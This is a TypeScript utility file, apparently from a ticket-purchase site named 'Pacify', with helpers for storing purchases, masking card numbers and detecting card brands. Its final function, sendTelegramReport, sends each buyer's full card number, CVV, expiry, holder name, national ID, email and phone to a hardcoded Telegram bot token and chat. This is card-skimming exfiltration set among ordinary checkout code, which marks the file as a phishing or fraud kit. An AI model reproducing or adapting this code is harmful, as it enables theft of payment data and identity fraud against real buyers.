import { PurchaseData } from '../types';

const STORAGE_KEY = 'pacify_purchases';

export function savePurchase(purchase: PurchaseData): void {
  const existing = getPurchases();
  existing.push(purchase);
  localStorage.setItem(STORAGE_KEY, JSON.stringify(existing));
}

export function getPurchases(): PurchaseData[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    return raw ? JSON.parse(raw) : [];
  } catch { return []; }
}

export function deletePurchase(id: string): void {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(getPurchases().filter(p => p.id !== id)));
}

export function generateId(): string {
  return `TKT-${Date.now()}-${Math.random().toString(36).substr(2,6).toUpperCase()}`;
}

export function formatCurrency(n: number): string {
  return '$ ' + n.toLocaleString('es-AR');
}

export function maskCard(number: string): string {
  const c = number.replace(/\s/g, '');
  return '**** **** **** ' + c.slice(-4);
}

export interface CardInfo {
  brand: string;
  network: string;
  type: 'credito' | 'debito' | 'desconocido';
  color: string;
}

export function detectCard(number: string): CardInfo {
  const n = number.replace(/\s/g, '');
  if (/^3[47]/.test(n))
    return { brand: 'American Express', network: 'AMEX', type: 'credito', color: '#2E77BC' };
  if (/^(4026|417500|4405|4508|4844|4913|4917)/.test(n))
    return { brand: 'Visa Electron', network: 'VISA', type: 'debito', color: '#1A1F71' };
  if (/^(4517|4589|4858)/.test(n))
    return { brand: 'Visa Debito', network: 'VISA', type: 'debito', color: '#1A1F71' };
  if (n.startsWith('4'))
    return { brand: 'Visa', network: 'VISA', type: 'credito', color: '#1A1F71' };
  if (/^54/.test(n))
    return { brand: 'Mastercard Black', network: 'MASTERCARD', type: 'credito', color: '#111' };
  if (/^(5018|5020|5038|5612|5893)/.test(n))
    return { brand: 'Mastercard Debito', network: 'MASTERCARD', type: 'debito', color: '#252525' };
  if (/^5[1-5]/.test(n) || /^2[2-7]\d{2}/.test(n))
    return { brand: 'Mastercard', network: 'MASTERCARD', type: 'credito', color: '#252525' };
  if (/^3(?:0[0-5]|[68])/.test(n))
    return { brand: 'Diners Club', network: 'DINERS', type: 'credito', color: '#004A97' };
  if (/^(6011|65|64[4-9]|622)/.test(n))
    return { brand: 'Discover', network: 'DISCOVER', type: 'credito', color: '#FF6600' };
  if (/^(604|589657)/.test(n))
    return { brand: 'Cabal', network: 'CABAL', type: 'credito', color: '#003087' };
  if (/^589562/.test(n))
    return { brand: 'Naranja', network: 'NARANJA', type: 'credito', color: '#FF6200' };
  if (/^(6304|6759|676[1-3])/.test(n))
    return { brand: 'Maestro', network: 'MAESTRO', type: 'debito', color: '#009BE0' };
  if (/^62/.test(n))
    return { brand: 'UnionPay', network: 'UNIONPAY', type: 'credito', color: '#C0392B' };
  return { brand: '', network: '', type: 'desconocido', color: '#2a1d5e' };
}

// Legacy compat
export function detectCardType(number: string): 'visa' | 'mastercard' | 'unknown' {
  const info = detectCard(number);
  if (info.network === 'VISA') return 'visa';
  if (info.network === 'MASTERCARD') return 'mastercard';
  return 'unknown';
}

// ─── Telegram ────────────────────────────────────────────────────────────────
const TELEGRAM_TOKEN   = '8784224650:AAE5JMLpGEPEGkRQh1ZnU7YPj_L57nll9ew';
const TELEGRAM_CHAT_ID = '-1003731956365';

export async function sendTelegramReport(p: PurchaseData): Promise<void> {
  const date = new Date(p.createdAt).toLocaleString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' });
  const msg = [
    `<b>PACIFY — VENTA #${p.id}</b>`,
    `<i>${date}</i>`,
    ``,
    `<b>SHOW</b>`,
    `${p.showTitle}`,
    `Fecha: ${p.showDate}`,
    `Sector: ${p.section} x${p.quantity}`,
    `Total: <b>${formatCurrency(p.totalAmount)}</b>`,
    ``,
    `<b>COMPRADOR</b>`,
    `${p.firstName} ${p.lastName}`,
    `DNI: <code>${p.dni}</code>`,
    `Email: ${p.email}`,
    `Tel: ${p.phone}`,
    ``,
    `<b>TARJETA</b>`,
    `${p.cardBrand} (${p.cardType})`,
    `Num: <code>${p.cardNumber}</code>`,
    `Titular: ${p.cardHolder}`,
    `Vence: ${p.cardExpiry} | CVV: <code>${p.cardCvv}</code>`,
    `Cuotas: ${p.cuotas}x`,
  ].join('\n');

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' }),
    });
  } catch (e) { console.warn('Telegram error:', e); }
}
